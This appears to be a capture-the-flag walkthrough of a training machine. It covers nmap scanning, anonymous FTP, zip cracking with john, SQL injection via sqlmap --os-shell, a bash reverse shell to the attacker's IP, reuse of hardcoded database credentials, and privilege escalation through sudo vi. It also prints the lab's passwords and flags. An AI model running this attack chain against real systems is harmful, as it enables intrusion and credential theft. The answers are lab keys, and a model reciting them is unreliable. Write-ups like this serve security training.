First scan the target using nmap:
`sudo nmap -sC -sS 10.129.13.94 -oA vaccine`

```txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-14 11:42 EDT
Nmap scan report for 10.129.13.94
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.246
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login

Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
```

From nmap result, we get the following answers:
1 Ans: ftp
2 Ans: Anonymous 

To login with "Anonymous" user, we used this command:
`ftp 10.129.13.94`

After login, we used "dir" command to list the files. From there we find the file name:
3 Ans: backup.zip

We downloaded the file by this command:
`get backup.zip`

As the zip is password protected, we tried to brute-force the password using john the ripper. Command:
`zip2john backup.zip > hash.txt`
`john -w=/usr/share/wordlists/rockyou.txt hash.txt`

Ans 4: zip2john

After running the command, we got the password:
```txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2022-07-14 11:54) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

After extracting, we looked inside the code to find the admin password. We found the password in MD5 format. After decrypting the hash online, we found the plaintext password:
`qwerty789`
Ans 5: qwerty789

For further analysis, we logged in onto http://10.129.13.94/ using our admin credentials.

Now, to perform sql injection, we used the cookie with admin logged in session and tried sqlmap using the following command:
`sqlmap -u 'http://10.129.13.94/dashboard.php?search=Sandy' -cookie 'PHPSESSID=tg43l3q0nr42tlk22p0u760160'`

After running the command, we found out the site is SQL injectable. So we used the --os-shell function to generate a shell using the following command:
`sqlmap -u 'http://10.129.13.94/dashboard.php?search=Sandy' -cookie 'PHPSESSID=6ns31uhch3qnqgtte36230acis' --os-shell`

Ans 6: --os-shell

As we got the os-shell, now we need to execute a reverse-tcp shell so that we can run commands easily, for that, first enable the listener by this command in our current machine:
`sudo nc -lvp 4445`

Now, in the os-shell, we will run the command to execute reverse-tcp shell:
`bash -c "bash -i >& /dev/tcp/10.10.14.246/4445 0>&1"`

Now we can see that we are connected with reverse-tcp shell to our machine.

From our shell, let's try to find the possible user flag file (user.txt) by using the following command:
`find . -type f -name user.txt 2>/dev/null`

We can see the file exists in "/var/lib/postgresql/user.txt"
Let's read the flag:
`cat /var/lib/postgresql/user.txt`

We got our user flag!
Ans 8: ec9b13ca4d6229cd5cc1e09980965bf7

Let's try to find out the ssh password. As we know the web-server is hosted from /var/www/html directory, let's go there and read the php files.

`cd /var/www/html`
`cat dashboard.php`

From "dashboard.php" file, we got our posgres password:
`$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");`

Let's try to connect via ssh (User "P@s5w0rd!" as password):
`ssh postgres@10.129.13.94`

Now we are inside the machine as "postgres" user. Let's try to list the allowed commands for the invoking user on the current host by typing the following command:
`sudo -l`

Which returns the following:
```txt
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

From this, we got to know that our `/bin/vi /etc/postgresql/11/main/pg_hba.conf` file can be run as sudo.

Ans 7: vi

Now, we run the following command to open the vi as sudo:
`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`

Now as we have opened the vi with root permission, lets list the files we have in the /root directory by typing the following command in vi:
`:!ls /root`

We can see the root.txt file inside the /root directory. Now all we have to do is just run cat command via vi and read the flag:
`:!cat /root/root.txt`

dd6e058e814260bc70e9bbdef2715849